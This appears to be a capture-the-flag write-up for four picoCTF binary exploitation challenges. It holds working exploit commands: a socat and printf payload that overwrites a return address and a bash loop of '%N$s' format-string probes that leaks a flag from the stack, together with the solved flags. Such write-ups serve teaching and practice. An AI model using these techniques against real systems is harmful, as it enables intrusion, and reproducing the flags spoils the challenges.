# buffer overflow 0

**Flag:** `picoCTF{ov3rfl0ws_ar3nt_that_bad_c5ca6248}`

## Approach

- Connect to the instance with `$ socat - TCP4:saturn.picoctf.net:57579` and type a long string of `a`s.

```
Input: aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa
picoCTF{ov3rfl0ws_ar3nt_that_bad_c5ca6248}
```

&nbsp;

&nbsp;

<hr style="border:2px solid gray; background-color: gray">
&nbsp;

&nbsp;

# buffer overflow 1

**Flag:** `picoCTF{addr3ss3s_ar3_3asy_b15b081e}`

## Approach

- Inputting short strings into the program always results into jumping to the same memory location.
- Input a long string of `a`s into the program. This results in a jump to `0x61616161`, which is the hex converted `utf-8` value of the character `a`.
- Using a non-repeating pattern generator (linked in references), we can find the exact offset created by the buffer, which is 44.

![buffer-value](images/Binary%20Exploitation/buffer%20overflow%201/buffer-val.png)

- To find the memory address at which the `win()` function is stored, we can use Rizin/Cutter's 'Disassembly' tab. The address is `0x080491f6`. Since this involves typing invalid `utf-8` characters, we will have to make use of `printf` to type the hex values directly.
- `nc` cannot easily pipe into `stdin`, so we can use `socat` instead.
- Now we can connect to the remote address:
```
$ socat - TCP4:saturn.picoctf.net:56983 < <(printf "123456789012345678901234567890123456789012ab\xf6\x91\x04\x08")
Please enter your string: 
Okay, time to return... Fingers Crossed... Jumping to 0x80491f6
picoCTF{addr3ss3s_ar3_3asy_b15b081e}
```

## New concepts

1. `printf` entering hexadecimal values
2. `socat`'s working
3. Buffer overflowing to another function's values

## Incorrect methods tried

- Entering hex values directly into `stdin`
- Entering invalid `utf-8` characters into `stdin`
- Piping hex values using `echo`
- Piping the string into `nc`

## References

- https://zerosum0x0.blogspot.com/2016/11/overflow-exploit-pattern-generator.html
- https://www.codetable.net/ (https://www.codetable.net/hex/8)
- https://stackoverflow.com/a/36312514 (`socat`)
- https://stackoverflow.com/a/33702982 (`printf`)

&nbsp;

&nbsp;

<hr style="border:2px solid gray; background-color: gray">
&nbsp;

&nbsp;

# format string 0

**Flag:** `picoCTF{7h3_cu570m3r_15_n3v3r_SEGFAULT_c8362f05}`

## Approach

- Examining the code, we can see that we have to complete 2 "orders". The first one expects the number of characters to exceed twice the buffer. The second one expects an "unintentional" string print.
- The first stage gives 3 options: `"Breakf@st_Burger", "Gr%114d_Cheese", "Bac0n_D3luxe"`. The `Gr%114d_Cheese` option is correct as `%114d` prints at least 114 characters, which easily exceeds 64.
- The second stage also gives 3 options: `"Pe%to_Portobello", "$outhwest_Burger", "Cla%sic_Che%s%steak"`. The `Cla%sic_Che%s%steak` is the correct option has it has `%s`, which prints the flag.

## New concepts

1. `%d` with numbers in `printf()`
2. `printf()`'s and `scanf()`'s return values

## Incorrect methods tried

- Trial and error method

## References

- https://stackoverflow.com/questions/55579326/printf2d-in-c-programming (`%d` with numbers)

&nbsp;

&nbsp;

<hr style="border:2px solid gray; background-color: gray">
&nbsp;

&nbsp;

# flag leak

**Flag:** `picoCTF{L34k1ng_Fl4g_0ff_St4ck_11a2b52a}`

## Approach

- The challenge has the tag `format_string`, and the source code has the following vulnarable line of code, which prints the input string without checking for format strings in the user's input.
```
   printf(story);
```
- The flag varible is made just before the reading of the input, so we can brute-force values till we get the flag, exiting the program with `ctrl + c` once the flag is found.
```
$ for i in {0..99}; do echo "%$i\$s" | nc saturn.picoctf.net 60505; done
```
```
CTF{L34k1ng_Fl4g_0ff_St4ck_11a2b52a}
```
- Just add `pico` to the start of this.

&nbsp;

&nbsp;

<hr style="border:2px solid gray; background-color: gray">
&nbsp;

&nbsp;

